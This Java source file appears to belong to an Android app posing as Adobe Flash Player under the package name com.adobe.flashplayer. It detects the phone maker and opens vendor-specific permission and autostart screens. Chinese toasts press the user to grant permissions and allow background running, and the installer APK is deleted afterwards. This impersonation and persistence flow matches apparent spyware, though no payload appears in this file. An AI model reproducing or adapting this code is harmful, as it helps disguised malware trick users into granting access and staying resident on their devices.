package com.adobe.flashplayer.install;

import java.io.File;

import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Toast;

public class InstallAuthority implements OnClickListener{
    private Activity context;
    private static  String TAG = "[ljg]InstallAuthority";

    public InstallAuthority(Activity context){
        this.context = context;
    }

    @Override
    public void onClick(View v) {
        try{
            String factory = android.os.Build.MANUFACTURER;
            String model = android.os.Build.MODEL;
            if (factory.contains("Xiaomi")) {
                MIUI miui = new MIUI();
                miui.authority(context);
            }
            else if (model.contains("Nexus")) {
                try{
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.android.settings", "com.android.settings.Settings$ManageApplicationsActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }catch(Exception ex){
                    Log.e(TAG,"Nexus app permission error");
                }
            }
            else if (factory.contains("GXI")) {
                if (Utils.isAppRunning(context, "com.zhuoyi.security.lite")) {
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ComponentName comp = new ComponentName("com.zhuoyi.security.lite", "com.freeme.sc.smart.permission.SP_Activity_Launcher");
                    intent.setComponent(comp);
                    context.startActivity(intent);
                }else{
                    defaultSettings(context);
                }
            }
            else if (factory.contains("ZTE")) {
                if (Utils.isAppRunning(context, "com.zte.heartyservice")) {
                    Intent intent = new Intent();
                    //intent.setAction("com.zte.powersavemode.autorunmanager");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ComponentName comp = new ComponentName("com.zte.heartyservice", "com.zte.heartyservice.permission.PermissionHost");
                    intent.setComponent(comp);
                    context.startActivity(intent);
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("LENOVO")) {
                if (Utils.isAppRunning(context, "com.lenovo.safecenter")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.lenovo.safecenter"));
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("vivo")) {
                Funtouch funtouch = new Funtouch();
                funtouch.authority(context);
            }
            else if (factory.contains("samsung")) {
                if (Utils.isAppRunning(context, "com.samsung.android.sm_cn")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.samsung.android.sm_cn"));
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("Letv")) {
                if (Utils.isAppRunning(context, "com.letv.android.letvsafe")) {
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.letv.android.letvsafe"));
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ComponentName comp = new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.PermissionAndApps");
                    intent.setComponent(comp);
                    context.startActivity(intent);
                }
                else if(Utils.isAppRunning(context, "com.letv.android.supermanager")){
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ComponentName comp = new ComponentName("com.letv.android.supermanager", "com.letv.android.supermanager.activity.PermissionManagerActivity");
                    intent.setComponent(comp);
                    context.startActivity(intent);
                }else{
                    InstallAuthority.defaultSettings(context);
                }
            }

            else if (factory.contains("Meizu")) {
                Meizu meizu = new Meizu();
                meizu.authority(context);
            }
            else if (factory.contains("Sony")) {
                if (Utils.isAppRunning(context, "com.sonymobile.cta")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.sonymobile.cta"));
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("OPPO")) {
                ColorsOS coloros = new ColorsOS();
                coloros.authority(context);
            }
            else if (factory.contains("ulong")) {
                //com.yulong.android.security/.ui.activity.AppManagerActivty
                if (Utils.isAppRunning(context, "com.yulong.android.coolsafe")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.yulong.android.coolsafe"));
                }
                else if(Utils.isAppRunning(context, "com.yulong.android.security")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.yulong.android.security.ui.activity.AppManagerActivty"));
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if(factory.contains("Coolpad")){
                if(Utils.isAppRunning(context, "com.yulong.android.security")) {
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.yulong.android.security.ui.activity.AppManagerActivty"));
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.yulong.android.security", "com.yulong.android.security.ui.activity.AppManagerActivty");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("YuLong")) {
                if (Utils.isAppRunning(context, "com.yulong.android.coolsafe")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.yulong.android.coolsafe"));
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }
            else if (factory.contains("HUAWEI") || factory.contains("Huawei")) {
                EMUI emui = new EMUI();
                emui.authority(context);
            }
            else if (factory.contains("LG")) {
                Intent intent = new Intent("android.intent.action.MAIN");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                //intent.putExtra("packageName", BuildConfig.APPLICATION_ID);
                ComponentName comp = new ComponentName("com.android.settings", "com.android.settings.Settings$AccessLockSummaryActivity");
                intent.setComponent(comp);
                context.startActivity(intent);
            }
            else if (factory.contains("OnePlus")) {
                InstallAuthority.defaultSettings(context);
            }
            else if (factory.contains("360")) {
                if (Utils.isAppRunning(context, "com.qihoo360.mobilesafe")) {
                    Intent intent = new Intent();
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    //intent.putExtra("packageName", BuildConfig.APPLICATION_ID);
                    ComponentName comp = new ComponentName("com.qihoo360.mobilesafe", "com.qihoo360.mobilesafe.loader.a.ActivityN1NR3");
                    intent.setComponent(comp);
                    context.startActivity(intent);
                }
                else{
                    InstallAuthority.defaultSettings(context);
                }
            }

            else if (factory.contains("chuizi")) {
                Intent intent = new Intent("android.intent.action.MAIN");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                //intent.putExtra("packageName", BuildConfig.APPLICATION_ID);
                //ComponentName comp = new ComponentName("com.smartisanos.security", "com.smartisanos.security.PackagesOverview");
                ComponentName comp = new ComponentName("com.smartisanos.security", "com.smartisanos.security.SecurityCenterActivity");
                intent.setComponent(comp);
                context.startActivity(intent);
            }
            else{
                defaultSettings(context);
            }

            Toast.makeText(context, "请设置\""+ context.getString(R.string.app_name)+"\"权限",Toast.LENGTH_LONG).show();

            if (Build.VERSION.SDK_INT >= 23) {
                Permission.checkPermission(context);
            }

            InstallHelper.removeApk(context,"");

        }catch(Exception ex){
            ex.printStackTrace();
        }
    }



    private void getAppDetailSettingIntent(Context context) {
        Intent localIntent = new Intent();
        localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (Build.VERSION.SDK_INT >= 9) {
            localIntent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
            localIntent.setData(Uri.fromParts("package", context.getPackageName(), null));
        } else if (Build.VERSION.SDK_INT <= 8) {
            localIntent.setAction(Intent.ACTION_VIEW);
            localIntent.setClassName("com.android.settings","com.android.settings.InstalledAppDetails");
            localIntent.putExtra("com.android.settings.ApplicationPkgName", context.getPackageName());
        }
        context.startActivity(localIntent);
    }



    public static void defaultSettings(Context context){
        Intent intent = new Intent();
        if (Build.VERSION.SDK_INT >= 9) {
            intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.fromParts("package", context.getPackageName(), null));
        } else if (Build.VERSION.SDK_INT <= 8) {
            intent.setAction(Intent.ACTION_VIEW);
            intent.setClassName("com.android.settings", "com.android.settings.InstalledAppDetails");
            intent.putExtra("com.android.settings.ApplicationPkgName", context.getPackageName());
        }

        context.startActivity(intent);
    }





    public  static class Funtouch {

        public  static void bootup(Context context){
            if (Utils.isAppRunning(context, "com.iqoo.secure")) {
                context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.iqoo.secure"));

//			Intent intent = new Intent();
//			ComponentName componentName= new ComponentName("com.iqoo.secure","com.iqoo.secure.ui.phoneoptimize.SoftwareManagerActivity");
//			intent.setComponent(componentName);
//			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//			intent.setAction(Intent.ACTION_VIEW);
//			context.startActivity(intent);
            }
            else{
                defaultSettings(context);

            }
        }


        public static  void authority(Context context){
            try{
                if (Utils.isAppRunning(context, "com.iqoo.secure")) {
                    context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.iqoo.secure"));

//    			Intent intent = new Intent();
//    			ComponentName componentName= new ComponentName("com.iqoo.secure","com.iqoo.secure.ui.phoneoptimize.SoftwareManagerActivity");
//    			intent.setComponent(componentName);
//    			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//    			intent.setAction(Intent.ACTION_VIEW);
//    			context.startActivity(intent);
                }
                else{
                    defaultSettings(context);
                }
            }
            catch(Exception ex){
                ex.printStackTrace();
            }
        }
    }






    public static  class ColorsOS {

        private static String TAG = "[ljg]ColorsOS";

        public  static void authority(Context context){
            try{
                if (Utils.isAppRunning(context, "com.coloros.safecenter")) {
                    //startActivity(getPackageManager().getLaunchIntentForPackage("com.coloros.safecenter"));
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.PermissionManagerActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                else if(Utils.isAppRunning(context, "com.oppo.safe")) {
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.oppo.safe"));
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.oppo.safe", "com.oppo.safe.permission.PermissionSettingsActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                else if (Utils.isAppRunning(context, "com.coloros.oppoguardelf")) {
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.coloros.oppoguardelf"));
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.oppo.safe", "com.oppo.safe.permission.PermissionSettingsActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                else{
                    defaultSettings(context);
                }
            }
            catch(Exception ex){
                ex.printStackTrace();
            }
        }


        public  static void bootup(Context context){
            try{
                if (Utils.isAppRunning(context, "com.coloros.safecenter")) {
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                else if (Utils.isAppRunning(context, "com.oplus.safecenter")) {
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.oplus.safecenter", "com.oplus.safecenter.startupapp.view.StartupAppListActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    Log.e(TAG,"start com.oplus.safecenter");
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.oppo.safe"));
                    //com.oppo.safe/.permission.startup.StartupAppListActivity
                }
                else if (Utils.isAppRunning(context, "com.oppo.safe")) {
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.oppo.safe"));
                    //com.oppo.safe/.permission.startup.StartupAppListActivity
                }
                else if (Utils.isAppRunning(context, "com.coloros.oppoguardelf")) {
                    //context.startActivity(context.getPackageManager().getLaunchIntentForPackage("com.coloros.oppoguardelf"));
                    Intent intent = new Intent();
                    ComponentName componentName = new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);

                }
                else{
                    defaultSettings(context);
                }
            }catch(Exception ex){
                ex.printStackTrace();
            }
        }
    }






    public  static class EMUI {
        public  static void bootup(Context context){
            Intent intent = new Intent();
            if (Build.VERSION.SDK_INT >= 24) {
                try{
                    ComponentName componentName = new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                catch(Exception e){
                    e.printStackTrace();
                }
            }
            else if (Utils.isAppRunning(context, "com.huawei.systemmanager")) {
                try{
                    ComponentName componentName = new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity");
                    intent.setComponent(componentName);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
                catch(Exception ex){
                    try{
                        ex.printStackTrace();
                        ComponentName componentName = new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.bootstart.BootStartActivity");
                        intent.setComponent(componentName);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    }
                    catch(Exception except){
                        ex.printStackTrace();
                    }
                }
            }
            else{
                defaultSettings(context);
            }
        }


        public static  void authority(Context context){
            try {

                //startActivity(getPackageManager().getLaunchIntentForPackage("com.huawei.systemmanager"));
                Intent intent = new Intent();
                ComponentName componentName = new ComponentName("com.huawei.systemmanager",
                        //"com.huawei.systemmanager.power.ui.DetailOfSoftConsumptionActivity"
                        "com.huawei.permissionmanager.ui.MainActivity");
                intent.setComponent(componentName);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);

            } catch (Exception e) {
                e.printStackTrace();

                defaultSettings(context);
            }
        }
    }





    public  static class MIUI {
        public  static  void bootup(Context context){
            if (Utils.isAppRunning(context,"com.miui.securitycenter") || Utils.isAppRunning(context, "com.miui.securitycenter")) {
                Intent intent;
                intent = new Intent(Intent.ACTION_VIEW);
                intent.setClassName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }else{
                Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.appmanager.AppManagerMainActivity");
                intent.setComponent(componentName);
                intent.putExtra("extra_pkgname", context.getPackageName());
                context.startActivity(intent);
            }
        }


        public  static void authority(Context context){
            if (Utils.isAppRunning(context, "com.miui.securitycenter")|| Utils.isAppRunning(context, "com.miui.securitycenter")) {
                try{
                    Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                    ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity");
                    intent.setComponent(componentName);
                    intent.putExtra("extra_pkgname", context.getPackageName());
                    context.startActivity(intent);
                }catch(Exception ex){
                    try{
                        Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                        ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.AppPermissionsEditorActivity");
                        intent.setComponent(componentName);
                        intent.putExtra("extra_pkgname", context.getPackageName());
                        context.startActivity(intent);
                    }catch(Exception e){

                        try{
                            Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                            ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.appmanager.AppManagerMainActivity");
                            intent.setComponent(componentName);
                            intent.putExtra("extra_pkgname", context.getPackageName());
                            context.startActivity(intent);
                        }catch(Exception ee){
                            ee.printStackTrace();
                        }
                    }
                }
            }
            else{
                Intent intent = new Intent("miui.intent.action.APP_PERM_EDITOR");
                ComponentName componentName = new ComponentName("com.miui.securitycenter", "com.miui.appmanager.AppManagerMainActivity");
                intent.setComponent(componentName);
                intent.putExtra("extra_pkgname", context.getPackageName());
                context.startActivity(intent);
            }
        }
    }











    public static class Meizu {
        public static void authority(Context context){
            if (Utils.isAppRunning(context, "com.meizu.safe")) {

                try{
                    //Intent intent = new Intent("com.meizu.safe.security.SHOW_APPSEC");
                    //intent.addCategory(Intent.CATEGORY_DEFAULT);
                    //intent.putExtra("packageName", BuildConfig.APPLICATION_ID);
                    //context.startActivity(intent);

                    Intent intent = new Intent("android.intent.action.MAIN");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.AppPermissionActivity");
                    //ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.ApplicationActivity");
                    //ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity");
                    //ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.security.AppSecActivity");
                    intent.setComponent(cn);
                    context.startActivity(intent);
                }catch(Exception ex){
                    try{
                        Intent intent = new Intent("android.intent.action.MAIN");
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity");
                        //ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.security.HomeActivity");
                        intent.setComponent(comp);
                        context.startActivity(intent);
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }
            }
            else{
                defaultSettings(context);
            }
        }


        public static void bootup(Context context){
            Toast.makeText(context, "请允许\"" + context.getString(R.string.app_name) +"\"后台运行",Toast.LENGTH_LONG).show();
            if (Utils.isAppRunning(context, "com.meizu.safe")) {
                try{
                    //context.startActivity(getPackageManager().getLaunchIntentForPackage("com.meizu.safe"));
                    Intent intent = new Intent();
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                    ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.SmartBGActivity");


                    //com.meizu.safe.permission.AutoRunActivity
                    //ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity");
                    intent.setComponent(cn);
                    context.startActivity(intent);
                }catch(Exception ex){
                    try{
                        Intent intent = new Intent();
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        //ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.security.HomeActivity");
                        ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity");
                        intent.setComponent(cn);
                        context.startActivity(intent);
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }
            }
            else{
                defaultSettings(context);
            }
        }
    }












}
